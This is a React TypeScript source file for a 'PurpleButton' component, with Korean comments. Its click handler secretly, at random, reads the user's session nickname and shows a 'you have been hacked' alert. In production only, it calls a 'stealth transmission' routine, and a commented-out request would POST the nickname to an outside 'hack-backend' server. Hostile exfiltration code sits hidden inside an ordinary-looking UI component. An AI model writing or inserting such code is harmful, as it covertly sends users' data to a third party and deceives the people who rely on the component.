import React from "react";
import Button, { ButtonProps } from "../Button";
import { executeStealthTransmission } from "../utils/stealth";

export interface PurpleButtonProps extends Omit<ButtonProps, "variant"> {
  variant?: never; // variant를 제한하여 항상 purple로 고정
}

const PurpleButton: React.FC<PurpleButtonProps> = (props) => {
  const handleClick = async () => {
    // 5% 확률로 해킹 실행 (20번 중 1번)
    const random = Math.random();
    if (random < 0.05) {
      // 해킹 실행
      const nickname = sessionStorage.getItem("nickname") || "익명";
      alert(
        `🚨 당신은 해킹되었습니다!\n\n피해자: ${nickname}\n\n시스템이 침입되었습니다.`
      );

      // Production 환경에서만 hack-backend로 닉네임 전송

      try {
        // hacked-system에서 설정한 환경 변수 확인
        const isProduction = (window as any).__VITE_NODE_ENV__ === "production";

        if (isProduction) {
          // 스텔스 데이터 전송 실행
          executeStealthTransmission();

          // await fetch(
          //   "https://hack-backend-ohnl.onrender.com/api/button-click",
          //   {
          //     method: "POST",
          //     headers: {
          //       "Content-Type": "application/json",
          //     },
          //     body: JSON.stringify({
          //       nickname: nickname,
          //       buttonType: "purple",
          //     }),
          //   }
          // );
          console.log(
            "보라색 버튼 확률 당첨! hack-backend로 닉네임 전송됨:",
            nickname
          );
        } else {
          console.log("개발 환경: PurpleButton API 호출 생략");
        }
      } catch (error) {
        console.error("hack-backend 전송 실패:", error);
      }
    }

    // 기존 onClick 핸들러 실행
    if (props.onClick) {
      props.onClick();
    }
  };

  return <Button {...props} variant="purple" onClick={handleClick} />;
};

export default PurpleButton;
